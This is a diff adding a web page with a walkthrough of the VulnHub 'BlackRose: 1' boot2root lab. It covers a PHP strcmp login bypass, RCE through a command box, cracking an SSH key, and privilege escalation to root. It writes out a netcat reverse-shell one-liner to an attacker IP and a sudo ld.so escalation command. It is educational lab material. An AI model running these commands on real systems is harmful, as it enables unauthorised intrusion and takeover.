@@ -1,0 +1,110 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">BlackRose: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/blackrose-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-07-18T11:55:37+00:00">July 18, 2020</time><time class="updated" datetime="2025-06-10T20:10:22+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another boot2root challenge called “BlackRose: 1”.  It’s available at VulnHub for penetration testing, you can download this from <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/blackrose-1,509/">here</a></strong>.</span></p>
+<p><span style="color: #000000;">The credit goes to <strong>BadLamer</strong> for designing this VM machine. Let’s start and learn how we can break this down.</span></p>
+<p><span style="color: #000000;">Level: <strong>Hard</strong></span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Steghide</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
+<ul>
+<li><span style="color: #000000;">ByPassing PHP strcmp()</span></li>
+<li><span style="color: #000000;">Remote Command Execute (RCE) from the application web</span></li>
+<li><span style="color: #000000;">Use of cryptography and cyphers (Cyberchef &amp; others)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abuse binary ld.so</span></li>
+<li><span style="color: #000000;">Cracking SSH Keys with John</span></li>
+<li><span style="color: #000000;">Reversing binary with Ghidra</span></li>
+<li><span style="color: #000000;">Abuse script with Filter ByPass extensions and WAF application</span></li>
+<li><span style="color: #000000;">Capture the flag</span></li>
+</ul>
+<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Reconnaissance</strong></span></h3>
+<p><span style="color: #000000;">So, let’s start this all by running up <strong>“nmap”</strong> with an <strong>“aggressive scan”</strong>, in order to capture the ports with the enabled operating system, software versions, scripts and traceroutes.</span></p>
+<pre class="lang:default decode:true">nmap -A –p- 192.168.1.21</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AFF6dtIXIlk/XxLdGWF1CAI/AAAAAAAAmAU/H7y9_DREqEY9kPgwnDDx09G5dr_o2PVPQCLcBGAsYHQ/s1600/1.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">As we enter the website, we were presented with an authentication system, which thus allows us to enter some credentials or to register ourselves into it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5hRXVVYe2w0/XxLdSYZitRI/AAAAAAAAmAY/h2cXn-c1VBonYehR2PTj9YNbk2CycbwDQCLcBGAsYHQ/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">On the other hand, we noticed a background image behind the login portal, thus we downloaded it in order to check whether it contains any specific information or not. As we track it over the <strong>steghide</strong> tool, we got something but we lacked with a key to decipher it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gsNTWkcBnUQ/XxLdcB4KWZI/AAAAAAAAmAg/Vjr0nXpZVwk0nth_NhbLTVxfDMd-JH2NgCLcBGAsYHQ/s1600/3.png"/></span></p>
+<h3><span style="color: #800000;">Exploiting</span></h3>
+<p><span style="color: #000000;">After trying to evade the form with other techniques, we were clear that this website is vulnerable to “<strong>strcmp</strong>“.</span></p>
+<p><span style="color: #000000;">Let’s capture this <strong>request</strong> in burpsuite and check what we can have over in its <strong>response.</strong></span></p>
+<p><span style="color: #000000;"><strong><u>Request Burp:</u></strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4tZOi9D5M8Y/XxLdm3aklEI/AAAAAAAAmAk/BYwWUAMLmdsXMYzv7l0xFm7Fid1jLH3QgCLcBGAsYHQ/s1600/4.png"/></span></p>
+<p><span style="color: #000000;"><strong><u>Response Burp:</u></strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iq9ATZJ15Lk/XxLdvBOs5fI/AAAAAAAAmAs/ek8T9JaTjEM4ioudcpEo9IV1T_liyLfLgCLcBGAsYHQ/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Great!! We execute the answer in our web browser and have bypassed the administration panel as “<strong>admin</strong>” user.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-q0sUCAqFS7U/XxLd9sywQ0I/AAAAAAAAmA0/uNqzblT1Q_UsKkmVjKqNgZetx2lpy_bLACLcBGAsYHQ/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Now as we go further, inside this panel, we got a hash in “<strong>bcrypt</strong>” and there is a box to type the input <strong>command</strong>. But if you try to run the “<strong>ls</strong>” command, it will pop you back out with an error.</span></p>
+<p><span style="color: #000000;">So let’s try to crack this captured hash through <strong>John The Ripper</strong>. As in the output result, you can see that we got the command as “<strong>whoami</strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qLOyOkDeqmw/XxLeIbAooOI/AAAAAAAAmA8/4AGQzZ1er240_SPfmECqS9va0J5W986-gCLcBGAsYHQ/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Let’s now try to execute the “<strong>whoami</strong>” command in the web-application.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OSweN2JxNug/XxLeUanZrJI/AAAAAAAAmBE/wOyQMg5L9yoXMv-q2eEsHz70vqhwYw3eQCLcBGAsYHQ/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Very well, as we are not aware of the application’s procedures, let’s then try to generate a hash in “<strong>bcrypt</strong>” with a command that will allow us to raise a reverse shell from our kali machine.</span></p>
+<pre class="lang:default decode:true">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.22 1234 &gt;/tmp/f</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0a1zXJKAcG4/XxLevRG890I/AAAAAAAAmBY/cyG6gLa87pUWCfQtEoOQugy6Et1zswlIgCLcBGAsYHQ/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">We’ll now set up a netcat listener at port <strong>1234</strong>. Further, change up the field hash and rewrite the command:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0PazQnMUiMU/XxLe2LhalFI/AAAAAAAAmBc/tYlyJWe1xiQ6QF3wbVjuan00zhBIfeUHgCLcBGAsYHQ/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Great!! We’ve successfully captured the victim’s Shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xTlw4hU-Mf4/XxLe-k8OoxI/AAAAAAAAmBg/TTfn_9Xy4CwlWV3tg0CtkQU4F5jzNa9XgCLcBGAsYHQ/s1600/11.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation (user “delx”)</strong></span></h3>
+<p><span style="color: #000000;">Thus with the help of python, we’ll have our interactive shell, now it’s time to get the privileges of the “<strong>delx</strong>” user.</span></p>
+<p><span style="color: #000000;">To do this, we will execute the command “<strong>sudo -l</strong>” and check whether we can make the use of a binary called <strong>“ld.so”,</strong> as easy as running:</span></p>
+<pre class="lang:default decode:true">sudo -u delx /bin/ld.so /bin.sh</pre>
+<p><span style="color: #000000;">From the below image, you can see that we got the shell with the user.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cNE3-XiEeMk/XxLfISzMPpI/AAAAAAAAmBs/RD7uJMA8GaU88e6OKWmsAUYRNdAlIvMowCLcBGAsYHQ/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">As we traverse the files of the user “<strong>delx</strong>“,  we encounter that it is having the directory as  <strong>“.ssh”</strong>, copy the “<strong>id_rsa</strong>” file and try to crack it with “<strong>ssh2john</strong>“, <strong>JohnTheRipper</strong> and the <strong>rockyou</strong> dictionary.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ViQ4d0aIoE8/XxLfTe0OppI/AAAAAAAAmB0/lAWyPEVlplobnxv9AikrvrSBOiH9DFU_ACLcBGAsYHQ/s1600/13.png"/></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qHGy0RDYQnk/XxLfeX5aJWI/AAAAAAAAmB8/NGbtPiea1hYpw1uDcWgzTfbAxnOps-wXQCLcBGAsYHQ/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Great!! We can now connect it via SSH!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-soMfkErOoxE/XxLfyE5EP_I/AAAAAAAAmCI/uhqdKHDSZQ4l-_hsnJtmDMN_NcliLCkigCLcBGAsYHQ/s1600/15.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation (user “yourname”)</strong></span></h3>
+<p><span style="color: #000000;">Let’s surf the files that were having access to the user “<strong>delx</strong>” and during the procedure, we were encountered with a binary file called “<strong>showPassword</strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OkDr8LpPhvI/XxLf_shzH3I/AAAAAAAAmCM/GQhi6GcKn8QTAQ5ozPo04keLp1hB9gNIgCLcBGAsYHQ/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Thus the binary will be used to check a <strong>password</strong> to decipher the content that is marked in <strong>green</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-i5Uo8oTEdx4/XxLgLW2hD5I/AAAAAAAAmCU/XKsOVQdFjxI7qfuDi2iawep8xnqJeK6EgCLcBGAsYHQ/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">We will analyze the code with <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a> </strong></span>(you can even use some other), check for its decompiler and list the password inside it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OnleC1SYZjo/XxLgVZgiKyI/AAAAAAAAmCc/U5Em3NsSGVwlU1HS-16ecnKps9OQ8sCOwCLcBGAsYHQ/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">We go back to the binary, type the password and check whether it is correct or not.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WRHsGz8kmlM/XxLgabYai-I/AAAAAAAAmCg/RxtbHM92vfAiFdVR8L38WJWbhHz_BXpBQCLcBGAsYHQ/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">Let’s try to decipher the content over some online tools. I’ve used <strong>AES encryption </strong>to do so. From the below image, you can see that we are now again having another <strong>encrypted</strong> <strong>text</strong> to entertain.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-073amynZ_i0/XxLggd46I8I/AAAAAAAAmCo/8JYG7pcUj0gzrzBqw3oHDT8sgpC261RswCLcBGAsYHQ/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">After testing this key with all the 3 users, it didn’t work for any of them. Do you remember the background image that we’ve downloaded in the beginning?</span></p>
+<p><span style="color: #000000;">Let’s try to do it here.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uBBk8doERvQ/XxLgoWjvgOI/AAAAAAAAmCw/zvmngjhX--cZRxJjTU4KPUx1lRYvXDUzwCLcBGAsYHQ/s1600/21.png"/></span></p>
+<p><span style="color: #000000;">After checking every possible way, we finally decrypted it as “<strong>ROT47</strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gedlUyfQ8Ig/XxLgwTAD66I/AAAAAAAAmC4/CNUs7rH72LYTvZKReG-v3swUrA_b145YACLcBGAsYHQ/s1600/22.png"/></span></p>
+<p><span style="color: #000000;">Let’s now try the password with the user “<strong>yourname</strong>” and therefore we’ve finally captured the flag of “<strong>user.txt</strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-R7-TZauvZbY/XxLg26vD6_I/AAAAAAAAmC8/7ERDJmchHmIEtqR9rPRKOmHvsI44L7Y6gCLcBGAsYHQ/s1600/23.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation (root)</strong></span></h3>
+<p><span style="color: #000000;">Fire up “<strong>sudo -l</strong>” and list a script which we can execute as “<strong>root</strong>“.</span></p>
+<p><span style="color: #000000;">As we tried to execute it, we got prompted with a message as <strong><em>“Invalid file read”</em></strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hg_GzwqttCA/XxLhBox_xnI/AAAAAAAAmDI/LzQJZ-URmCMSBro_lcFzy7H8FQJZIyZ_QCLcBGAsYHQ/s1600/24.png"/></span></p>
+<p><span style="color: #000000;">It’s clear that we do not have access to the script, but it is also understandable that it can be filtered by the extensions.</span></p>
+<p><span style="color: #000000;">After trying to read different extensions, we find one that worked for us i.e. “<strong>PHP</strong>“!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Lieu-oxAB44/XxLhJ_BcQ-I/AAAAAAAAmDQ/4N6yinLYFFwFZ4ORab17JCaaD9zozTnsgCLcBGAsYHQ/s1600/25.png"/></span></p>
+<p><span style="color: #000000;">As you can see, it passes the extension filter, but it doesn’t run the content. This can be because the script might have the “<strong>WAF</strong>” function and filters some words.</span></p>
+<p><span style="color: #000000;">After some documentation, I modified the proof of concept and I managed to bypass the “<strong>WAF</strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Zg5tgJbqL7c/XxLhZF4GhxI/AAAAAAAAmDY/bGErXT1Uh-I0jPpuEOLUkMBmBDFlEfJjgCLcBGAsYHQ/s1600/26.png"/></span></p>
+<p><span style="color: #000000;">Well, let’s not waste any more time, and add up “<strong>/bin/sh</strong>” in order to capture the <strong>root’s shell</strong> to read the contents of the file “<strong>root.txt</strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dscNsfNKtDI/XxLhf_C9CQI/AAAAAAAAmDg/5ZyKvDpQKyojqArQM-fqdiEB5No1BSs-wCLcBGAsYHQ/s1600/27.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: <strong>David Utón</strong> is Penetration Tester and security auditor for Web applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks Contacted on <span style="color: #0000ff;"><strong>LinkedIn</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/David_Uton">Twitter</a></strong></span>.</span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
